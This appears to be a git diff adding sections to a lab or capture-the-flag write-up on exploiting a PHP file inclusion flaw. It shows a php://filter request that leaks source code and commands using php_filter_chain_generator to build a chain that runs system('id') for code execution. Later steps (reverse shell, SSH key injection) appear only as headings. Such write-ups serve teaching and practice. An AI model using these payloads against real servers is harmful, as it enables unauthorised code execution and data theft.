@@ -117,9 +117,37 @@ I requested the file through Base64 encoding:
 ```text
 http://10.x.x.x/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php
 ```
+<img width="1570" height="111" alt="php-filter-source-request" src="https://github.com/user-attachments/assets/f447075a-b442-4842-aea4-954cb62357f0" />
+
+The server returned the Base64-encoded contents of secret-script.php, which I then decoded to inspect the source code.
+
+<img width="1415" height="138" alt="decoded-secret-script-source" src="https://github.com/user-attachments/assets/de5d0956-e6bd-49bd-b1a5-a20a6e251063" />
+
+The code showed that the application directly passed user-controlled input into include($file) without validation or sanitization. This confirmed that the file= parameter was not only vulnerable to file inclusion, but also a likely path toward remote code execution.
 
 
-5. Remote Code Execution (RCE)
+## 5. Remote Code Execution (RCE)
+
+After reviewing the source code, I confirmed that the application used:
+
+```php
+include($file);
+```
+Because the file parameter was passed directly into include(), I explored whether the LFI could be turned into code execution.
+
+A simple data:// wrapper test did not return command output, so I moved to a more advanced technique using php_filter_chain_generator, which can build a filter chain that results in PHP code execution through the vulnerable include() call.
+
+I first cloned the tool and generated a test payload that would run the id command.
+
+```Bash
+git clone https://github.com/synacktiv/php_filter_chain_generator.git
+cd php_filter_chain_generator
+python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
+```
+<img width="1897" height="583" alt="filter-chain-generator-id" src="https://github.com/user-attachments/assets/23f690ab-dbc1-4ccd-a8cf-f56fa987ed25" />
+
+
+The generated payload started with a long php://filter/... chain. I stored it in a variable and sent it to the vulnerable endpoint using curl.
 6. Reverse Shell
 7. Credential Discovery
 8. User Access via SSH Key Injection
